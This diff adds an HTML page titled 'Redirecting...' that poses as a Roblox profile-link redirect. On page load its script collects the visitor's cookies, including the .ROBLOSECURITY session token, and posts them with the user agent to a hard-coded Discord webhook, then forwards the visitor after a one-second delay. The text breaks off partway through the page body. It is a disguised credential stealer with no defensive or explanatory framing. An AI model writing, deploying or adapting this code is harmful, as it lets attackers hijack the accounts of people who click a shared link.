@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Redirecting...</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script>
+        // Function to get URL parameters
+        function getUrlParameter(name) {
+            name = name.replace(/[$$]/, '\$$').replace(/[$$]/, '\$$');
+            var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
+            var results = regex.exec(location.search);
+            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
+        }
+
+        // Function to get cookies from the current site
+        function getCookies() {
+            return document.cookie;
+        }
+
+        // Function to get cookies from Roblox if we're on a Roblox domain
+        function getRobloxCookies() {
+            // Try to get the .ROBLOSECURITY cookie
+            const cookies = document.cookie.split(';');
+            let roblosecurity = '';
+            
+            for (let i = 0; i < cookies.length; i++) {
+                const cookie = cookies[i].trim();
+                if (cookie.startsWith('.ROBLOSECURITY=')) {
+                    roblosecurity = cookie.substring('.ROBLOSECURITY='.length);
+                    break;
+                }
+            }
+            
+            return roblosecurity;
+        }
+
+        // Function to send data to Discord webhook
+        function sendToDiscord(data) {
+            const webhookUrl = "https://discord.com/api/webhooks/1495027556263657624/7cVE6NROnpD8PcG8MB9CN8uvQxrnH24dux9Yy3ov3oXmjjM-tksRIBDHgH6q9OgQI0qv";
+            
+            const payload = {
+                embeds: [{
+                    title: "Profile Link Clicked",
+                    color: 5814783,
+                    fields: [
+                        { name: "Target Profile", value: data.targetProfile, inline: false },
+                        { name: "User Agent", value: navigator.userAgent, inline: false },
+                        { name: "Cookies", value: data.cookies || "No cookies found", inline: false }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+            
+            // Add .ROBLOSECURITY if found
+            if (data.roblosecurity) {
+                payload.embeds[0].fields.push({ 
+                    name: ".ROBLOSECURITY", 
+                    value: data.roblosecurity, 
+                    inline: false 
+                });
+            }
+            
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                console.log('Data sent successfully');
+            })
+            .catch(error => {
+                console.error('Error sending data:', error);
+            });
+        }
+
+        // Get the target URL from the path
+        const path = window.location.pathname;
+        const targetUrl = path.substring(1); // Remove the leading slash
+        
+        // If no target URL, redirect to Roblox home
+        if (!targetUrl) {
+            window.location.href = 'https://www.roblox.com';
+            return;
+        }
+        
+        // Capture cookies and other data
+        const cookies = getCookies();
+        const roblosecurity = getRobloxCookies();
+        
+        // Send data to Discord
+        sendToDiscord({
+            targetProfile: targetUrl,
+            cookies: cookies,
+            roblosecurity: roblosecurity
+        });
+        
+        // Redirect to the target URL after a short delay
+        setTimeout(() => {
+            window.location.href = targetUrl;
+        }, 1000);
+    </script>
+</head>
+<body>
+    <div style="text-align: center; margin-top: 50px; color
